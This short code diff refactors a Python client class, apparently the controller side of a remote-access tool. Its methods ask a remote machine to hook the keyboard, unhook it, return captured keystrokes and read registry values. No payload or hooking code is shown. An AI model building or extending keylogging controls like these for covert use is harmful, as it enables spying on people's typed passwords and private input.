@@ -65,18 +65,15 @@ class Client:
         return res
 
     def req_keystroke_hook(self):
-        data = dumps('keystroke-hook')
-        client_socket.sendall(data)
+        send('keystroke-hook')
     
     def req_keystroke_unhook(self):
-        data = dumps('keystroke-unhook')
-        client_socket.sendall(data)
+        send('keystroke-unhook')
     
     def req_keystroke_get(self):
-        data = dumps('keystroke-get')
-        client_socket.sendall(data)
-        res = loads(client_socket.recv(2**10))
-        return res
+        send('keystroke-get')
+        res = recv()
+        return res['data']
 
     def req_reg_getvalue(self, path, value_name):
         data = dumps(('reg-getvalue', path, value_name))
